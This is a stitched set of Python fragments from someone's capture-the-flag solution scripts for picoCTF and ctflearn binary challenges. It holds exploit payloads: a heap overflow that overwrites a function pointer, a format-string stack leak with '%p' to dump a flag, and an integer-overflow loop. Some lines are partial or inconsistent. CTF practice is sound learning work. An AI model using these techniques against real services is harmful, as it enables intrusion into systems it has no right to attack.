        self.payload += self.pwn.p32(int(self.win_address, 16))
        self.payload += self.pwn.p32(self.win_address)
        # self.payload = self.payload[:-2]
        # self.payload += b"\x40"

        self.payload += struct.pack(">I", self.win_address)
        self.payload = self.payload[:-2]
        self.payload += b"\x40"

        length = (16 - length) // 2
        for _ in range(length):
            self.payload += b"\x00"

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def main(self):

        # self.build_payload()

        # return

        # Welcome message
        for _ in range(2):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b"Enter your choice: ")
        # print(out)

        self.conn.sendline(b"2")

        self.conn.recvuntil(b"Data for buffer: ")

        # self.payload = b"A" * 32 + b"\xa0\x11\x40\x00\x00\x00\x00\x00"
        self.payload = (
            b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xa0\x11\x40\x00\x00\x00\x00\x00"
        )
        print(self.payload)
        self.conn.sendline(self.payload)
        print(self.conn.recvuntil(b"choice: "))

        # self.conn.sendline(b"3")
        # print(self.conn.recvuntil(b"choice: "))
        self.conn.sendline(b"4")
        print(self.conn.recvuntil(b"choice: "))

	# /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_num = 0
        self.menu_text = "Enter a number to add: "

        # self.send_menu(9999999999999999999999, display=True)
        # self.recv_lines(1, display=True)

        self.looper()

	# /home/figaro/CTF/Categories/Binary/ctflearn/Positive_Challenge/payloads/solution.py
    def looper(self):
        payload = "-1-1-2-3-4-5-6-7-8-9-10-11-12-13-14-15-16-17-1813-14-15-16-17-18---1"
        payload = "-1-1-1111111111111--11111111111111"

        times = 110
        for i in range(times):
            self.send_menu(payload)
            self.recv_lines(1, display=True)
        # self.recv_lines(10, display=True)
        # self.recv_lines(1, display=True)

        # # acc = self.recv_lines(1, save=True)[0]
        # # print(acc)

        # self.send_menu("1--1")

        self.recv_lines(times, display=True)

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def main(self):
        self.prepare_space(
            files=["flag.txt"], folder=self.folders["files"], test_text="ctflean{test}"
        )
        self.menu_text = "What is your favorite format tag? "
        self.menu_num = 0

        addresses = self.read_address_positions(11)
        flag = self.decode_address(addresses, 7, 11)

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def read_address_positions(self, positions):
        """
        Reads the address of the stack

        Args:
            positions (int): Number of positions to read

        Returns:
            list: List of addresses
        """
        # How to read a specific address
        payload = "%p " * positions
        output = self.simple_payload_send(payload)
        address_all = output.decode("utf-8").strip("\n").split(" ")

        return address_all

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def decode_address(self, address_all, start=0, end=None):
        """
        Description:
            Decodes the address of the stack

        Args:
            address_all (list): List of addresses
            start (int, optional): Starting position of the address. Defaults to 0.
            end ([type], optional): Ending position of the address. Defaults to None.

        Returns:
            bytes: Decoded text of the address
        """
        decoded_text = b""

        if end is None:
            end = len(address_all)

        for i in range(start, end):
            decoded_text += self.pwn.p64(int(address_all[i], 16))
        return decoded_text

	# /home/figaro/CTF/Categories/Binary/ctflearn/Leak_me/payloads/solution.py
    def simple_payload_send(self, payload, lines=1):
        """
        Description:
            Sends a simple payload to the connection

        Args:
            payload (str): Payload to send
            lines (int, optional): Number of lines to receive. Defaults to 1.

        Returns:
            bytes: Output of the connection
        """
        bruter = CTFSolver(conn="remote", url=self.url, port=self.port)
        bruter.initiate_connection()
        bruter.menu_text = self.menu_text
        bruter.menu_num = self.menu_num
        bruter.send_menu(choice=payload)
        output = bruter.recv_lines(lines, save=True)

        if len(output) > 0:
            return output[0]

	# /home/figaro/CTF/Categories/Binary/ctflearn/Two_Times_Sixteen/payloads/solution.py
    def main(self):
        self.initiate_connection(cwd=self.folders["data"])

